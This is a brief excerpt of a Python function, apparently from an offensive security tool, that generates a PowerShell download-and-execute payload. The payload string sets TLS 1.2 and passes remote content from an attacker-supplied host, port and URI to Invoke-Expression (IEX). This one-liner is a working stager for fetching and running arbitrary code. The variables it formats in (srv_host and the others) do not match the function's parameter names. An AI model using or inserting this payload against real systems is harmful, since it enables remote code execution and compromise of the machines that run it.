...
def generate_payload(lang, host, port, uri):
    ...
    if lang == "powershell":
        ...
        payload_primitive = "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;$v=new-object net.webclient;IEX ((new-object Net.WebClient).DownloadString('http://{}:{}/{}'));".format(
            srv_host, srv_port, srv_uri)
